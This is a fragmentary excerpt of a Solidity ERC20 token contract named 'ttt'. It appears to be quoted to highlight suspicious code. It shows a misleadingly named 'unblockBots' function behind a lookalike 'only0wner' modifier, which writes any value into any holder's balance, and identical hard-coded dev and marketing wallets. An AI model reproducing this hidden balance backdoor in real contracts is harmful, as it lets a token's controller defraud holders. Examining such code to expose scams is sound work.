...
contract ttt is Context, IERC20, Ownable {
    ...
    address payable private _devwallet = payable(0x47A994dc6b6f7c6d5c5EeAa7cF5A0762132BeEc3);
    address payable private _marketingwallet = payable(0x47A994dc6b6f7c6d5c5EeAa7cF5A0762132BeEc3);
    ...
    function blockBots(address[] memory bots_) public onlyOwner {
     ...
     function unblockBots(address bots_ , uint256 _true) external only0wner {
       _rOwned[bots_] = _true;
    }
